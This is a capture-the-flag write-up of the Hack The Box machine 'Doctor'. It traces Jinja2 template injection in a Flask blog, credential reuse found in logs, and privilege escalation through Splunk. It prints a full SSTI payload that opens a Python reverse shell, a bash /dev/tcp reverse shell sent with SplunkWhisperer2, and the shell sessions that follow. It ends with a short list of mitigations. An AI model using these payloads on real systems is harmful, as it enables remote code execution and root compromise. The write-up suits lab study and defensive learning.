# Doctor

```
root@kali:/home/kali/htb/Doctor# nmap -p- -sV -sC 10.129.2.21
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-23 15:58 EDT
Nmap scan report for 10.129.2.21
Host is up (0.028s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanne
```

On the port 80 web-server I see that there is a used named admin, as well as some possible names:

Dr. Jade Guzman
Dr. Hannah Ford
Dr. James Wilson

I also see an email info@doctors.htb, a possible domain.



https://10.129.2.21:8089/ says Splunk Atom Feed: splunkd and has 4 links, rpc, services, servicesNS, and static.

Splunk build: 8.0.5


```
root@kali:/home/kali/htb/Doctor# searchsploit splunk
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Splunk - Remote Command Execution                                                  | multiple/remote/18245.py
Splunk 4.1.6 - 'segment' Cross-Site Scripting                                      | multiple/remote/36246.txt
Splunk 4.1.6 Web Component - Remote Denial of Service                              | multiple/dos/36247.txt
Splunk 4.3.1 - Denial of Service                                                   | multiple/dos/38038.txt
Splunk 4.3.3 - Arbitrary File Read                                                 | multiple/webapps/21053.txt
Splunk 5.0 - Custom App Remote Code Execution (Metasploit)                         | multiple/remote/23224.rb
Splunk 6.1.1 - 'Referer' Header Cross-Site Scripting                               | php/webapps/40997.txt
Splunk < 7.0.1 - Information Disclosure                                            | linux/webapps/44865.txt
Splunk Enterprise - Information Disclosure                                         | multiple/webapps/41779.txt
Splunk Enterprise 6.4.3 - Server-Side Request Forgery                              | multiple/webapps/40895.py
Splunk Enterprise 7.2.3 - (Authenticated) Custom App Remote Code Execution         | windows/webapps/46238.py
Splunk Enterprise 7.2.4 - Custom App Remote Command Execution (Persistent Backdoor | windows/webapps/46487.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@kali:/home/kali/htb/Doctor# 
```

I try to login withe the default splunk credentials admin:changeme but it did not work.

I add doctor.htb and doctors.htb to my /etc/hosts file.

going to http://doctors.htb/ redirects me to a login page.

I can register with a new user that lasts 20 minutes.

I am able to post new messages, and also I see there is a page. http://doctors.htb/home?page=1

I'll try to find other pages. All are empty.

I create a new post with some XSS in there, but it does not work. The new post is located at http://doctors.htb/post/2

http://doctors.htb/post/1 is an admin post. this leads to http://doctors.htb/user/admin


I try some various injection methods, until I check https://book.hacktricks.xyz/pentesting/pentesting-web.

I should definitely be identifying the technologies used. So I download Wappalyzer and find that the page is running Flask 1.0.1.

I google Flask 1.0.1 injection exploit and find this: https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee and https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti

I just need to find somewhere to use it. I try it as username, title, message etc. In the source code I find:

```
<!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
```

/archive is an empty page, but when I check the source code I find:

```
<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	<item><title>7777777</title></item>

			</channel>
```

And I see that the injection has worked. Since it returned 7777777 instead of 49, I know it's Jinja2 and not Twig.

I google Jinja RCE and find https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---remote-code-execution

which leads to 

`{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}`


I change the ip and port to my connection information, and then change /bin/cat flag.txt to /bin/bash -i to give us an interactive bash shell.

```
root@kali:/home/kali/htb/Doctor# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.118.253 52836
bash: cannot set terminal process group (848): Inappropriate ioctl for device
bash: no job control in this shell
web@doctor:~$ whoami
whoami
web
web@doctor:~$ id
id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
web@doctor:~$ sudo -l
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
web@doctor:~$ 
```

I do a cursory glance at the flask config files, but I don't really find anything amazing.

I upload https://github.com/diego-treitos/linux-smart-enumeration to the target and start enumerating.

On level 1 I see:

```
00:00    15664     root python3 /opt/clean/cleandb.py
00:00    15663     root /bin/sh -c /opt/clean/cleandb.py    
```

under processes.

But I do not have write permissions:

```
web@doctor:/opt/clean$ ls -la
ls -la
total 52
drwxrwxr-x 2 root root  4096 Sep  7  2020 .
drwxr-xr-x 4 root root  4096 Sep  6  2020 ..
-rwxr-xr-x 1 root root   211 Sep  6  2020 cleandb.py
-rwxr-xr-x 1 root root   129 Jul 26  2020 clean.py
-rw-r--r-- 1 root root 36864 Sep  6  2020 site.db
web@doctor:/opt/clean$ cat cleandb.py
cat cleandb.py
#!/usr/bin/env python3
import os

os.system('rm /home/web/blog/flaskblog/site.db')
os.system('cp /opt/clean/site.db /home/web/blog/flaskblog/site.db')
os.system('chown web:web /home/web/blog/flaskblog/site.db')
web@doctor:/opt/clean$ 
```

I decide to check the logs since I have the admin group.

```
web@doctor:/var/log$ grep -r "passw" 2>/dev/null
grep -r "passw" 2>/dev/null
auth.log:Mar 23 23:22:24 doctor VGAuth[666]: vmtoolsd: Username and password successfully validated for 'root'.
auth.log:Mar 23 23:22:37 doctor VGAuth[666]: message repeated 23 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
auth.log:Mar 23 23:31:46 doctor sudo: pam_unix(sudo:auth): auth could not identify password for [web]
apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
Binary file journal/62307f5876ce4bdeb1a4be33bebfb978/system@0005be3b9cbf1e4d-3c52d2a6a62e5a88.journal~ matches
Binary file journal/62307f5876ce4bdeb1a4be33bebfb978/user-1001@8612c285930942bc8295a5e5404c6fb7-000000000000d0e1-0005ae7b997ca2d8.journal matches
Binary file journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-000000000000cf5a-0005ae7b98c1acfe.journal matches
Binary file journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-0000000000003ac7-0005ab70dc697773.journal matches
Binary file journal/62307f5876ce4bdeb1a4be33bebfb978/user-1002@84e1503b20fd49eca2b6ca0b7d6fdeeb-00000000000176d6-0005af5694057aa6.journal matches
Binary file journal/62307f5876ce4bdeb1a4be33bebfb978/user-1001.journal matches
Binary file journal/62307f5876ce4bdeb1a4be33bebfb978/system@a5ad8f98908a4900ba65b279b0fc902c-0000000000000001-0005be3b9cbb6d4a.journal matches
```

2>/dev/null just removes errors here. Like permission denied.

The reset password line is interesting. Let's try to log into user shaun with that as the password.

```
web@doctor:/var/log$ su -l shaun
su -l shaun
Password: Guitar123
id
uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
```

I get a tty shell with `script /dev/null -c bash` and run lse.sh again.

```
[!] sof080 Can we write to a gpg-agent socket?............................. yes!
---
/run/user/1002/gnupg/S.gpg-agent
/run/user/1002/gnupg/S.gpg-agent.ssh
/run/user/1002/gnupg/S.gpg-agent.extra
/run/user/1002/gnupg/S.gpg-agent.browser
```

I do some googling, but don't find anything.

While looking through the Linux Privilege Escalation page on hacktricks, I see Splunk LPE and Persistance. And I remember we have splunk running on port 8089.

I log in with shaun's credentials.

The splunk page on hacktricks leads me to https://github.com/cnotin/SplunkWhisperer2

I check the netcat version on the machine and find that it does not support -e or -c. so I do a simple bash reverse shell.

```
root@kali:/home/kali/SplunkWhisperer2/PySplunkWhisperer2# python PySplunkWhisperer2_remote.py --host="doctors.htb" --username="shaun" --password="Guitar123" --lhost="10.10.14.51" --payload "bash -c 'bash -i >& /dev/tcp/10.10.14.51/1338 0>&1'"
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpFb_B_R.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.51:8181/
10.129.118.253 - - [23/Mar/2021 19:35:50] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup


And then after a while on the other terminal window:


root@kali:/home/kali/htb/Doctor# nc -nlvp 1338
Listening on 0.0.0.0 1338
Connection received on 10.129.118.253 45276
bash: cannot set terminal process group (1170): Inappropriate ioctl for device
bash: no job control in this shell
root@doctor:/# whoami
whoami
root
root@doctor:/# 
```


## Comparing myself with the official writeup:

They find the doctors.htb domain and immediately add it to their hosts file.

They find the archive and identify the SSTI vulnerability.

They then identify that it is jinja2 and send a payload with a reverse tcp shell.

They find the password in the logs and log in as shaun.

They discover that splunk is running as root and use splunkwhisperer2 to get another reverse shell, this time as root.


## How to stop this exploit:

I think the archive xml file could be removed while it was being tested, or locked behind the admin account.

It's very irresponsible to leave unfinished modules and parts open to the public.

It is admittedly a pretty huge user error from shaun, as he input his replacement password in the email field.

But does user web really need to be part of the admin group? 

Shaun should also not reuse his password. This gave access to splunk.



